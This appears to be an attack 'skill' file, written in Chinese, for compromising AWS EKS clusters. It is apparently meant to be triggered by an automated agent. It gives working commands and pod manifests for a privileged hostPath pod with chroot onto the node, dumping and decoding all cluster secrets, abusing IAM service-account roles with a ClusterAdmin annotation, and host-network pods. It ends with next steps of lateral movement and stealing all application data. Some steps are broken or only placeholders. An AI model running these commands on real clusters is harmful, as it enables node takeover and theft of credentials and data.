---
name: aws-eks-attack
type: attack
category: container-orchestration
platform: aws
severity: high
---

# AWS EKS 攻击技能

## 触发条件

- 有 AWS 凭证且有 EKS 权限
- 发现 eks:* 权限
- 用户要求"攻击 EKS 集群"

## 前置检查

```bash
# 1. 列出 EKS 集群
aws eks list-clusters --region us-east-1

# 2. 更新 kubeconfig
aws eks update-kubeconfig --name CLUSTER_NAME --region us-east-1

# 3. 验证访问
kubectl get nodes
```

## 攻击方法

### 方法 1: 创建特权 Pod

```bash
# 1. 创建特权 Pod
cat > eks-privileged.yaml <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: privileged-container
    image: ubuntu:latest
    command: ["/bin/bash"]
    args: ["-c", "sleep infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: root-volume
      mountPath: /host
  volumes:
  - name: root-volume
    hostPath:
      path: /
EOF

kubectl apply -f eks-privileged.yaml

# 2. 进入 Pod
kubectl exec -it privileged-pod -- bash

# 3. 访问节点
chroot /host
```

### 方法 2: 窃取 Secrets

```bash
# 1. 列出所有 secrets
kubectl get secrets --all-namespaces

# 2. 获取 secret 内容
kubectl get secret SECRET_NAME -n NAMESPACE -o yaml

# 3. 解码 secret
kubectl get secret SECRET_NAME -n NAMESPACE -o jsonpath='{.data.password}' | base64 -d
```

### 方法 3: IAM Role for Service Account 滥用

```bash
# 1. 列出 service accounts 和 IAM roles
kubectl get serviceaccounts --all-namespaces
kubectl get sa -o yaml | grep -A 5 "iam.amazonaws.com/role"

# 2. 创建高权限 SA
cat > privileged-sa.yaml <<'EOF'
apiVersion: v1
kind: ServiceAccount
metadata:
  name: privileged-sa
  annotations:
    eks.amazonaws.com/role-arn: arn:aws:iam::ACCOUNT_ID:role/ClusterAdmin
EOF

kubectl apply -f privileged-sa.yaml

# 3. 使用高权限 SA 创建 Pod
cat > sa-pod.yaml <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: sa-pod
spec:
  serviceAccountName: privileged-sa
  containers:
  - name: attack-container
    image: ubuntu:latest
    command: ["/bin/bash"]
    args: ["-c", "sleep infinity"]
EOF

kubectl apply -f sa-pod.yaml
kubectl exec -it sa-pod -- bash

# 4. 在 Pod 中访问 AWS API
aws eks list-clusters
```

### 方法 4: 节点网络访问

```bash
# 1. 列出节点
kubectl get nodes -o wide

# 2. 创建访问节点的 Pod
cat > node-access.yaml <<'EOF'
apiVersion: v1
kind: Pod
spec:
  hostNetwork: true
  containers:
  - name: node-access
    image: ubuntu:latest
    command: ["/bin/bash"]
    args: ["-c", "sleep infinity"]
EOF

kubectl apply -f node-access.yaml
kubectl exec -it $(kubectl get pod -l app=node-access -o jsonpath='{.items[0].metadata.name}') -- bash

# 3. 访问节点
curl http://NODE_IP:6443/healthz
```

### 方法 5: VPC 间攻击

```bash
# 1. 列出所有集群的 VPC
aws ec2 describe-vpcs --filters "Name=tag:eksctl.cluster.k8s.io/vpc-name"

# 2. 在不同 EKS 集群间移动
# 通过节点网络访问其他集群
```

### 方法 6: AWS VPC CNI 插件利用

```bash
# 1. 检查 VPC CNI 版本
kubectl get daemonset aws-node -n kube-system -o yaml | grep image

# 2. 利用已知漏洞（CVE-2020-XXXXX 等）
# 通过 Pod 注入获取节点访问
```

## 验证成功

```bash
# 成功创建特权 Pod
kubectl get pods | grep privileged

# 成功获取 secrets
kubectl get secrets

# 成功访问 AWS API
aws sts get-caller-identity
```

## 下一步

1. 在集群中横向移动
2. 窃取所有应用数据
3. kubernetes-attack - 执行更多 K8s 攻击
